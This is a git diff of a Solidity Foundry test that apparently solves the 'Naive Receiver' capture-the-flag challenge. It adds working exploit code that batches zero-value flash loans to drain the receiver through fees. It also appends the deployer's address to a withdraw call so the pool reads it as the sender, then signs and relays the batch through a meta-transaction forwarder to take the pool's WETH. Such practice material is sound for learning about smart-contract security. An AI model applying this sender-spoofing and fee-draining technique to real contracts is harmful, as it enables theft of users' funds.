@@ -83,20 +83,25 @@ contract NaiveReceiverChallenge is Test {
             datas[i] = abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", receiver, weth, 0, "");
         }
 
-        // datas[10] = abi.encodeWithSignature("withdraw(uint256,address)", ) hmmm
+        datas[10] = abi.encodeWithSignature("withdraw(uint256,address)", WETH_IN_POOL + WETH_IN_RECEIVER, recovery, deployer); // deployer added for the _msgSender() to get it as the sender
 
         BasicForwarder.Request memory request = BasicForwarder.Request({
             from: player,
             target: address(pool),
             value: 0,
-            gas: 0,
+            gas: 1000000,
             nonce: 0,
             data: abi.encodeWithSignature("multicall(bytes[])", datas),
-            deadline: block.timestamp + 1000
+            deadline: block.timestamp + 1 hours
         });
 
         // pool.multicall(datas); // lets try to do it in 1 tx instead of 2 (because the multicall could be used directly since it doesn't check the _msgSender() unlike the withdraw function)
 
+        bytes32 digest = _hashTypedData(_getDataHash(request));    //                 <---------- using our reconstructed EIP712 _hashTypedData function
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
 
         console.log("works?");
     }
